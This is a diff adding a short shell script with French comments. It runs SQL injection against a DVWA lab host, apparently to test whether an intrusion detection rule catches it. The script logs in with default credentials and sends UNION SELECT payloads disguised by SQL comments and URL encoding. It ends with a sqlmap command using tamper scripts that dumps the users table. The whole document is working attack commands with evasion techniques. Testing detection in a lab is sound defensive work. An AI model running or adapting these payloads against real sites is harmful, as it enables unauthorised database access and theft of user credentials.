@@ -1,0 +1,14 @@
+# Récupérer le cookie d'abord
+curl -s -c /tmp/c.txt -d "username=admin&password=password&Login=Login" http://dvwa:80/login.php -L -o /dev/null
+
+# Niveau 1 — payload en clair (détecté ?)
+curl -s -b /tmp/c.txt "http://dvwa:80/vulnerabilities/sqli/?id=1+UNION+SELECT+1,2--&Submit=Submit" | grep -i "first name"
+
+# Niveau 2 — commentaires SQL (contourne content:UNION SELECT ?)
+curl -s -b /tmp/c.txt "http://dvwa:80/vulnerabilities/sqli/?id=1+UN%2F**%2FION+SEL%2F**%2FECT+1,2--&Submit=Submit" | grep -i "first name"
+
+# Niveau 3 — encodage URL (%55 = U)
+curl -s -b /tmp/c.txt "http://dvwa:80/vulnerabilities/sqli/?id=1+%55NION+SELECT+1,2--&Submit=Submit" | grep -i "first name"
+
+# Niveau 4 — SQLmap avec tamper
+sqlmap -u "http://dvwa:80/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=$(grep PHPSESSID /tmp/c.txt | awk '{print $7}'); security=low" --batch --tamper=space2comment,randomcase --random-agent -D dvwa -T users --dump
